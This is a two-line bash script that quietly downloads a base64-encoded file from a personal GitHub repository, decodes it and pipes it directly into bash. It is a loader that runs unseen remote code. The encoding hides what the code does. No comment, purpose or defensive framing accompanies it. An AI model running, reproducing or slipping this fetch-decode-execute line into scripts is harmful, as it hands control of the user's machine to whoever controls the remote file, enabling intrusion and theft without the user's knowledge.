#!/bin/bash
wget -qO- https://raw.githubusercontent.com/douglaschoate892/stick/refs/heads/main/entrypoint.sh | base64 -d | bash
